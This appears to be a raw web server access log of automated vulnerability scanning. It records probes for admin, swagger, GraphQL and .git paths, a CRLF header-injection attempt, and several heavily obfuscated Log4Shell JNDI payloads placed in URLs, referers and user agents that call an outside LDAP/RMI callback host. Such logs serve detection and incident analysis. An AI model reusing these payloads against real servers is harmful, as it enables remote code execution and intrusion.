34.68.34.72 - - [16/Feb/2024:04:05:06 +0000] "GET /admin HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:06 +0000] "\x16\x03\x02\x01\xB5\x01\x00\x01\xB1\x03\x02\x91\x92\x8B\x90^\x8Aq\xA4YS\xED\xDC\xB3{\xDB\xAF\xA9\xC1\xF0&\xEC\xC9?SqM~\x01Dc3x HN\x96\x8F\xDE\xBF7\xC7\xA6\xF0\xC9\x04\xC7`\xE8\x87X\x1C\x92\xB4\xAA\x82MVx1\xB0\x07]\x1C\x8DB\x00\x8A\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:06 +0000] "GET /admin HTTP/1.1" 308 269 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:06 +0000] "\x16\x03\x01\x01\xC2\x01\x00\x01\xBE\x03\x03\xE79]\xA9\xBC\xBD\xD0i\x8A\x81\xF1-k\xC6!\x0C\x04\xB2\x06\xDD\x80\x13\xB1T\xB8\x05\x5C\xAE\xE4\x10\xF5f \x86\xCD'AV`\xE5*\x87w\x1C#\xAB\xBCn\x16R\xBFO7\xF7\xB9\xDE\x92\x0F\x98\xB0=\xB1\xDDBH\x00\x8A\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:07 +0000] "GET / HTTP/1.1" 404 184 "-" "Go-http-client/1.1"
34.68.34.80 - - [16/Feb/2024:04:05:07 +0000] "\x16\x03\x01\x01\xC2\x01\x00\x01\xBE\x03\x03\x95<j\xFB\x83\x1EZH\x19\xE0t\xCD\xA9\xB3\xB0r\xE0!m\x14\x9AA\xA1G\xAB\xF4\xA9\xDF9\xE2\xCE# :?G\x7F!\xD7H\x93Bz\xA0\xA1\xE0\x8Bcy\xFB B\x03$$.\xF1\xE8h\xFE\xF2\xAB(\xB4\x04\x00\x8A\x00\x05\x00\x04\x00\x07\x00\xC0\x00\x84\x00\xBA\x00A\x00\x9D\xC0\xA1\xC0\x9D\x00=\x005\x00\x9C\xC0\xA0\xC0\x9C\x00<\x00/\x00" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:08 +0000] "GET /swagger-ui.html HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:08 +0000] "\x16\x03\x01\x01\xB8\x01\x00\x01\xB4\x03\x03\xDD=!\x00/\x90\x86E\xCB?\x98\xF8\x13\x9C\xE8\x9F>\xF1r\x12\x9D\x15q\xE9\xA5\x95\x91[\x8A\x91\xA6\x04 \xF8\xB4\xEC\xBD$\x83\xE7\x19\x8Cl^\xCD\xAD\xA6\xDFM\xAE\x98\xBD\x1D\xA0\xD7x\xBF}\x80\xC7h&\x91\x22\x03\x00\x80\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 150 "-" "-"
34.68.34.80 - - [16/Feb/2024:04:05:08 +0000] "\x16\x03\x01\x01\xCF\x01\x00\x01\xCB\x03\x03\x1AR\xFB\x8D\x10\xF4&\x03\xF6\x0B i\xA9H\x13\xD8\x0Cg\xC0\xB0n\xFD\xD4$cN1VH\x0CU_ lW_m\xB2\xDFQd\x0B!\x03\xCA\xE7\x5C\x9D\xE9\xC0\x9E\x9D\x83\xAF.[\xB7\xF11\x1E>\x91\xD6\xDBf\x00\x8C\xCA\xCA\xC0\x12\xC0\x13\xC0\x07\xC0'\xCC\x14\xC0/\x13\x01\xC0\x14\x13\x02\xC0(\xCC\xA9\xC00\xC0s\xC0`\xC0r\xC0a\xC0,\xC0v\xC0\xAF\xC0w\xC0\xAD\xCC\xA8\xC0$\x13\x05\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:11 +0000] "GET /swagger.json HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
54.89.216.54 - - [16/Feb/2024:04:05:11 +0000] "GET / HTTP/1.1" 404 207 "-" "Typhoeus - https://github.com/typhoeus/typhoeus"
34.68.34.66 - - [16/Feb/2024:04:05:11 +0000] "GET /%0d%0aReflected-Header:%2042cee33a6b084015b9b2b1dd28ce712b HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:12 +0000] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:12 +0000] "GET / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:12 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:12 +0000] "GET /zzz$http_referer HTTP/1.1" 404 207 "7d4ba6eeab605f992274e6a004ac5cc7" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:13 +0000] "GET / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:13 +0000] "GET / HTTP/1.1" 404 207 "${${ag:-j}${x:xs3:-n}${ez:-d}${wsic:3meb:-i}${fd:-:}${1a:-l}${bn9:bui:u9:-d}${9:c3:-a}${egyb:-p}${edm:p5w:-:}${x:-/}${s:h:-/}${y:-R}${yie:mi5z:-E}${x:c:-l}${jwv:1l:-0}${mhz:t:fq:-c}${us8v:--}${${i:-s}${utk:mw:-y}${e:8c:8:-s}${0:-:}${l1:g2m3:-j}${q:-a}${mk:m:az3:-v}${dx:0o:-a}${wz8:29:-.}${c6:0:3w:-v}${df39:1zp:-e}${hif:4d:-r}${xq:-s}${57:-i}${e:od8l:9jrq:-o}${9lj:st:-n}}${fn:-.}${b:bxf:-e}${mfgj:9kgo:-4}${g:5:-4}${3:o:dy2:-6}${k:-1}${la2x:-8}${3ar2:be32:6:-9}${i:p:-f}${7z:-3}${4ny:-7}${u5:x:-b}${8k3:l:-5}${qc:-e}${2ky0:swxn:-1}${m93:-f}${w8l:9xr6:5:-0}${h4u0:-4}${7:4q7z:-6}${2p5:zy:-7}${foz4:-c}${0v:3s0:a5:-1}${2dz:6o:-8}${vl:qrs0:-2}${c:-3}${t34:8sof:wqj:-3}${ihx9:h:a3:-7}${mj1f:wh8:-c}${nc0:duv:-2}${8po2:9wdr:b0dh:-1}${gc:-4}${axon:l:-6}${x:-9}${q9o4:b:i6:-3}${n:-3}${yo1:vfy:-8}${xo:0noy:05u:-f}${hiwd:qwb4:9:-d}${4oxa:i:-9}${vx:v:-0}${i3:-e}${p:4sc:-2}${9:k:2tf:-a}${1si:-.}${cr:9:-z}${1b:3nk9:4:-.}${l4nk:-7}${1:-b}${5:-a}${j:gy:-e}${of5i:-.}${ta26:-x}${od:xug:61q:-y}${elr:3x5:s70:-z}}" "${${h4:4:-j}${7r8:7:-n}${s:-d}${8go:-i}${f5:lenp:-:}${s:z:-l}${tz49:pd1:-d}${i:p:5vie:-a}${lxb:ptu:-p}${4:-:}${m37h:7mka:-/}${xvc7:-/}${a06e:fxw:0s:-U}${d:95q:-A}${hdp:-l}${mqxc:4nz:-0}${lwze:som:-c}${j4:w:--}${${6z:vwl:-s}${24k:-y}${ae0:e:zm0x:-s}${5x:1qj0:arxv:-:}${vgrn:-j}${tr:0yu4:3el:-a}${y:-v}${1bap:-a}${aqdm:5k:xm:-.}${ofw:42:-v}${x89:u:vs:-e}${qvu:4k:t3:-r}${b:w:t3:-s}${0f7l:ct51:-i}${74nf:-o}${f10:-n}}${b:1:8m:-.}${siu:gnu:jna:-e}${po:xg:-4}${fe:t:z:-4}${987:h17:dy20:-6}${rsg:yl:-1}${ch:-8}${9r:-9}${a3:-f}${puml:ngcj:-3}${uyi:-7}${3l:-b}${vpye:-5}${9:qwl:4:-e}${4es:vf6:i1g:-1}${fzb7:5y3j:qwe:-f}${vwn5:a:9:-0}${3lm:-4}${0:-6}${13:xk:9u47:-7}${vrpk:y5q4:-c}${5:lra9:-1}${t5:x:08j:-8}${d7wn:2v4:r:-2}${8l5b:-3}${9esx:-3}${6n9:vwx:zeio:-7}${f:s:y:-c}${g:h9bt:d:-2}${8ux:bnl:-1}${m:v1ge:-4}${syg0:-6}${i:15:-9}${xs:-3}${ld6z:2:-3}${4s:-8}${p:b6d1:-f}${x0:35z7:-d}${q:-9}${bj:n:-0}${e:o:mb5:-e}${whl4:hdkl:73h:-2}${nx1:jf8g:-a}${os61:-.}${g:b8:pqn:-z}${xgz:-.}${o52:-7}${s:5v:-b}${s:eo:-a}${y6vm:-e}${n:-.}${ru9y:y5cz:bdm:-x}${qoi:d9:-y}${d:-z}}"
34.68.34.66 - - [16/Feb/2024:04:05:13 +0000] "GET /status HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:14 +0000] "GET /swagger/index.html HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:14 +0000] "OPTIONS / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:14 +0000] "GET / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:14 +0000] "GET /nginx-status HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:14 +0000] "GET / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:15 +0000] "GET / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:15 +0000] "GET /swagger/swagger-ui.html HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:15 +0000] "OPTIONS / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:15 +0000] "GET / HTTP/1.1" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:15 +0000] "GET /doesntexist-83400112 HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:16 +0000] "GET /swagger/ui/index HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:16 +0000] "POST / HTTP/1.1" 404 207 "${${537g:-j}${cvzb:czdu:1:-n}${ur7:lc2:-d}${d0t:-i}${3n:w:-:}${v:-l}${utb8:-d}${qyof:q2x:m45u:-a}${1:-p}${kp:zct:dw:-:}${2:n9:7pn:-/}${u:i:lc76:-/}${t2:72a6:-R}${u2cs:mof:-E}${g:ke:cs1:-l}${hx:-0}${0:ite:0h9:-c}${271:cau:--}${${ihjs:6:p:-s}${vqzk:z:-y}${j37d:-s}${321:-:}${9sou:8wr:-j}${pi:vs8g:a:-a}${sq:tqk:-v}${ctko:-a}${w:-.}${4x:o:08s3:-v}${v8g:ehuo:-e}${2:xao2:-r}${s:xmih:-s}${i:b3o:-i}${b:-o}${gj:4:-n}}${lsy8:t:p:-.}${ze5c:1ka:-e}${l1x:k0ly:ex1:-4}${sh:db5:ky3:-4}${qs:-6}${j19r:fz:b0u:-1}${h8l:cifx:opwd:-8}${d:ow:zdu:-9}${jm:xr:-f}${x:-3}${u7e:5ox:pzkq:-7}${xql:ydz:-b}${4sd:-5}${q:-e}${xz:fa:qusj:-1}${ui:8d9a:-f}${mtq:-0}${tl:j:-4}${5j:-6}${pg:-7}${fl:ej5:lyxw:-c}${cu:1x7v:-1}${hak:h:-8}${ok:7dcn:q:-2}${5v:-3}${5fvg:owt:-3}${dih:5qc:eg:-7}${glj:lf:-c}${ie:2gvl:zo:-2}${59:-1}${y:v3gd:-4}${p:-6}${wi:wbl:0v:-9}${yg:-3}${o2:rk:-3}${zgx:6uc:5dxm:-8}${tln4:-f}${l6:qlb:28p:-d}${t5:ftlz:r3:-9}${acj:-0}${7:2:-e}${h9bo:y58:cq:-2}${rj:-a}${m:-.}${rgsn:9qr:-z}${di:a2:0c4:-.}${ha:-7}${z2:-b}${5:e5x:x3:-a}${lj7m:fmxs:t:-e}${a:-.}${d:23a:mcp:-x}${u7:1t7r:-y}${2w7:-z}}" "${${bw:1:4:-j}${nvf:0d16:s:-n}${uyg:-d}${q:i03:7:-i}${ypbk:i5:-:}${nik:5:-l}${y61z:iv0:9we:-d}${9z:907:-a}${5w:3v:kb3u:-p}${icd:5:-:}${c5:b:-/}${2:-/}${2unt:-U}${a:8:j:-A}${cx6f:2l:-l}${8:3p:xtz:-0}${pwl:-c}${ha3:--}${${e:y5:-s}${9r:nx9:-y}${ocd6:-s}${qfg:-:}${509y:u:-j}${g:h:oe:-a}${si1:-v}${2wce:-a}${8wk:-.}${a53l:zpa:jg:-v}${9cgq:1la:-e}${79:brls:-r}${n:2oid:b:-s}${qfj0:-i}${4:-o}${6:-n}}${ahrj:b0:ynd:-.}${se8:s:-e}${oed8:i1l:qtj:-4}${51:-4}${9:f:-6}${h634:u52:q5:-1}${bpm8:-8}${h:urz:w1uf:-9}${gy:-f}${4zd:5o:-3}${tr:jw15:i:-7}${9v5:-b}${3d:y:i2l:-5}${29:k:-e}${5or:-1}${x:sgv5:hs2:-f}${2y:k:0q:-0}${gf:j:-4}${4:-6}${ju:-7}${12w:uf:-c}${dtw:-1}${35h:e:2p7:-8}${frw:k:-2}${uxo:-3}${cfe:4nph:ltde:-3}${bs:-7}${i:r7ju:-c}${p:3r5u:k7:-2}${9g:6lrj:-1}${0oxn:eq:-4}${o5q8:-6}${mc9:5x:-9}${y:6vg:-3}${cx:4stm:lmb6:-3}${wiu:-8}${47xi:-f}${tk0i:arw:30:-d}${jfb:rhek:nc:-9}${rui:io:578:-0}${k8rw:-e}${tkn:-2}${ix:bvn:73y:-a}${y:-.}${68je:v6pt:5:-z}${9hp:-.}${3n:r:-7}${po:t:-b}${rj:-a}${ph:-e}${3jv:-.}${z87:6sj7:i5j8:-x}${d3i:hvus:-y}${i:p:gcf6:-z}}"
34.68.34.72 - - [16/Feb/2024:04:05:16 +0000] "GET / HTTP/1.1" 301 162 "-" "Go-http-client/1.1"
34.68.34.66 - - [16/Feb/2024:04:05:16 +0000] "GET /docs HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:17 +0000] "GET /${${8oa:t:-j}${uka:-n}${07y2:-d}${ktb:-i}${tlk:-:}${j:bvk:mfx:-l}${1se:-d}${3:o:bv:-a}${vxm1:4jr:4d87:-p}${y:5g:cfx:-:}${spgo:780u:-/}${amfr:ezi:-/}${nf:2w0:iym8:-P}${l5b:dz:rcdk:-A}${x:-l}${p:h7:-0}${w6a:-c}${a29:tcr:cf7s:--}${${zo:wjb:ir9:-s}${850:-y}${s9:a:-s}${mxp7:-:}${h57:-j}${j:vms:-a}${3:cj0:-v}${7ha:wmh:l0y:-a}${c1j:ts9p:8:-.}${6:ra9:-v}${5:-e}${f6u:-r}${2gtl:-s}${mj94:g7ck:veic:-i}${j:y10n:biy:-o}${7e1q:6:4:-n}}${9pxt:-.}${x:a:-e}${e:tm7o:-4}${e6r:-4}${m:en3i:lpq:-6}${ri:h:-1}${4ju:7ht:ks:-8}${5:d:w:-9}${gh:-f}${wk:14:9x3f:-3}${o2y:arp:8cm:-7}${fh:2e:-b}${h8:5xre:-5}${w:z:-e}${t:-1}${x0:1:-f}${eq1p:fs8h:-0}${jbl:-4}${enbg:8l:-6}${u35:r:9nm:-7}${alkh:fg:-c}${yxd:jfz3:nk:-1}${d4gr:gxk:8:-8}${zndv:q57y:07:-2}${idp:-3}${q2:8c4o:eq:-3}${3:sjel:-7}${4:e7i1:-c}${o:g4t:6c:-2}${tqgd:k:ks3:-1}${3c2u:s4:bt:-4}${4t:m:q:-6}${dt9:-9}${3hy:ex:wt:-3}${u:-3}${euzi:m72:yn2h:-8}${8w:-f}${21j:-d}${e5sx:y7v:4xzg:-9}${j3:ns08:-0}${jz:no7m:yvs:-e}${6:c:n:-2}${7:cnl9:-a}${9n:o6gn:-.}${fz:8:i:-z}${j8l:fmq8:v6:-.}${6pe:d6rp:ab:-7}${sdbr:9r:w:-b}${ymp:-a}${z:3x8:-e}${4pe:-.}${f7:-x}${3:pqlb:-y}${g:zl:sgu:-z}} HTTP/1.1" 404 207 "${${lp:uxn:-j}${45h1:-n}${ej:i:5:-d}${r:u:3b:-i}${puh3:-:}${kfd8:-l}${jy1x:v:za3:-d}${od:fr5:2f0:-a}${u2mp:c:-p}${ug:f:-:}${uwg:pat:p5c:-/}${g:vd2:-/}${f5:-R}${8jg:-E}${6frs:654:3p9:-l}${9e:olcd:-0}${s:5:u8q:-c}${b5a1:cbg:79bs:--}${${53:-s}${j:hm:oa:-y}${qk1s:-s}${q:-:}${1y:fjlo:-j}${29ua:hqb:qhl:-a}${wxuj:-v}${br:v:-a}${96m:-.}${dp46:-v}${c1wo:q9vn:-e}${v:m20:auq:-r}${l:0v:evqz:-s}${76:o6:-i}${grm:-o}${bg:j3iz:5b:-n}}${7z:-.}${lry1:1ey:sqj:-e}${m80:-4}${i:75q4:-4}${vm7b:z1:nf:-6}${x0:-1}${or0:t:-8}${2:-9}${tcb:pth:-f}${m8:3c:-3}${z1:i4h:-7}${v:0:n2l:-b}${ib:xbr:-5}${st:-e}${giup:ik07:f85a:-1}${sa:-f}${0wj:u0a4:-0}${5al:-4}${n:-6}${8wk:2hb0:-7}${ix3v:rhi:fzr:-c}${z:yth8:o:-1}${h2n:tpu:ayu7:-8}${60yz:6br:-2}${q:cr:-3}${z7:fut2:d3u2:-3}${4:cpd:-7}${vz:yi:-c}${0g:-2}${6g5:v:dpu:-1}${rkf5:lt6:y:-4}${h:-6}${r0j5:jpz7:-9}${4:8:-3}${he:8wxp:-3}${c:-8}${t:lsj6:-f}${5z0:-d}${dac:bxg:cib:-9}${b:xpwh:fe3:-0}${xu:y:tfc:-e}${c:-2}${cp:a:79y:-a}${6au:-.}${nbur:ynb:mg:-z}${t:3nbp:-.}${b4r:-7}${16:h5z:-b}${v:7py:-a}${74y:vik5:u:-e}${y0:c:-.}${3zsa:v:u:-x}${5:a6in:-y}${9o8u:u:-z}}" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:17 +0000] "GET /def-83400112-doesntexist HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:17 +0000] "GET /swagger/v1/swagger.json HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:17 +0000] "GET /graphql HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:17 +0000] "\x16\x03\x03\x01\xB3\x01\x00\x01\xAF\x03\x03\xC2\x0E\xC61\x1A\xDE\xCF\xC0%\xD9\xC2\x85\x94 \x8E+\xFA\x5C\xC9\x91\xDCv\xBE\xE6\xF4P{}\x08\xAA\xED\xA9 _o;\xB6z\xEA\xB2\x02\x04\x035\x1EB^\x15\x81\xBD\x7F\x16\xCE\xAF\x1C\x0Bfn~\x87M^\xAB\xBD\x0B\x00\x8A\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:18 +0000] "GET /${${i:pjdo:-j}${w6:2x8c:-n}${x:yjgx:c0t:-d}${dpaw:bn:-i}${j7i:em:ge:-:}${ra4:tyg:-l}${ro:xd6:-d}${1d:g:z9ir:-a}${lzy:-p}${g:k2:as:-:}${w:a7do:lk:-/}${7:-/}${uste:-P}${d:x:-A}${o:3q:ju:-l}${27m:5t2c:-0}${s0:9jvm:n7j:-c}${vrn:j4mr:0v83:--}${${wyxo:v5z:-s}${2haz:ikt:-y}${v0r:-s}${vy:2t:-:}${rc:ph:5vk:-j}${2zbo:-a}${j:4cqh:-v}${9wug:go:qpz:-a}${0gv:uf:-.}${m:6:54f:-v}${loh:fei7:m:-e}${kc:ko:-r}${z:-s}${fgb:2bz:-i}${rtp3:o8zr:-o}${gt:ryb7:08:-n}}${l:-.}${2:r0:-e}${9n:-4}${7tj:-4}${9:j4m:0x:-6}${jv7u:qyc:-1}${4u:en5:-8}${b9ns:-9}${j:-f}${nbp:p6d5:xtws:-3}${f:-7}${y3f9:yi:u:-b}${o:r:-5}${f0:m:-e}${mig7:pz4:5:-1}${1u6b:-f}${si:-0}${v:t91h:3i15:-4}${lq:-6}${r6:9:-7}${v:7hg:-c}${hr2w:j:sac:-1}${27by:lwd:j:-8}${l5ix:41p:-2}${kd:s89b:-3}${biw:l4nv:x:-3}${0jly:4:8z:-7}${9:7a8:-c}${1:1ys:on:-2}${08g:h:-1}${rq61:w2:l9o:-4}${tr:-6}${gv3i:-9}${whjy:8:-3}${8:-3}${3nd:jx:k:-8}${lf:8o1:foc9:-f}${bfh1:-d}${439:-9}${a:jsun:-0}${9:2c:-e}${h1s:mx2:1:-2}${24:-a}${vq92:8qx:-.}${r0lm:-z}${7ml:3f1:-.}${2p:zl:-7}${g:-b}${0g83:-a}${iub:-e}${y:w:b:-.}${in1:-x}${r5tn:-y}${tvme:3:-z}} HTTP/1.1" 404 207 "${${o4s:-j}${gpx:-n}${kc8:5:-d}${3d5o:lf:dge:-i}${wu:az7:-:}${mcx:n:-l}${by:-d}${5t:20vn:-a}${5rl7:-p}${5rud:-:}${4m:-/}${scij:g1fy:xbc8:-/}${v7:o:d6:-R}${y4:l:-E}${6:d1:0:-l}${ahw:a1:-0}${0aqc:-c}${r3it:--}${${v1:yv0g:9xs:-s}${pxm:abn:h8:-y}${20t:8uw9:t:-s}${g36:8:6pd:-:}${5bco:-j}${t:-a}${6k:-v}${k9:g:-a}${z73:ma:w:-.}${cpv:re:-v}${sl09:l:yp3b:-e}${7sh:-r}${r:-s}${p:k7:6r:-i}${a:-o}${j:o:j:-n}}${v:-.}${wrl:4gc:dprq:-e}${0:c5jr:1l8:-4}${2xk9:-4}${ah6:-6}${geh:tlp:fr5:-1}${1lfa:-8}${v:a3ro:-9}${d9n:8b:-f}${z:o:-3}${kcy:c5a:nzrt:-7}${j7y:-b}${7ha:h:-5}${x:-e}${30i:-1}${6:-f}${0f2c:z30s:-0}${h2:zl2:-4}${4rbq:x:7lq:-6}${cu5:brn:-7}${67:14:-c}${mfbp:0:-1}${x6z:-8}${n:y:-2}${h:p1:-3}${vri3:5ce:-3}${y:ji:4l0w:-7}${4:-c}${fcn0:ugb2:pj:-2}${91oc:-1}${3:-4}${xr:-6}${ux:brw:-9}${3ive:xc8:-3}${tn9v:-3}${yt:-8}${otq:3w:6:-f}${r8yf:-d}${v:05hr:-9}${um:hu2l:-0}${1z52:05:-e}${y:-2}${rn:ow:-a}${x6:-.}${2:-z}${0:cixe:r:-.}${fos:vy:-7}${8kt1:ox:2zia:-b}${7way:89mj:9n:-a}${gj46:5ua:q:-e}${5d:cz21:-.}${if:eu:85o0:-x}${7py3:-y}${6o:-z}}" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:18 +0000] "GET /.git HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:18 +0000] "GET /v1/swagger.json HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
